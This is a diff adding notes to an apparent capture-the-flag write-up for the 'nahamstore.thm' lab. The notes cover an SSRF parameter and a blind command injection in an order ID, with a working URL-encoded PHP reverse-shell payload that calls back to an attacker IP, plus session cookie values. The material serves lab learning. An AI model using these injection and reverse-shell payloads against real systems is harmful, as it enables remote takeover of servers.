@@ -223,3 +223,24 @@ But we have to find Credit-card number in api, so we have to know subdomains of 
 ------------------------------------------------------------------------------------
 
 product_id=2&server=stock.nahamstore.thm@internal.api.nahamstore.thm#
+
+____________________________________________________________________________________________________________________________________________
+blind RCE injection
+--------------------
+
+Referer: http://nahamstore.thm/account/orders/4
+Cookie: session=c282c74308aa91b3b8df458aa468e9f6; token=2f8eed3802f94595e8c8283427f6e7a7
+Upgrade-Insecure-Requests: 1
+
+what=order&id=4$(whoami)
+
+It shows only 200 ok.
+
+It doesn't show error message, you can inject with php reverse shell (url encoding)
+-----------------------------------------------------------------------------------
+what=order&id=4$(php+-r+'$sock%3dfsockopen("10.4.52.17",1234)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b')
+____________________________________________________________________________________________________________________________________________
+
+
+
+
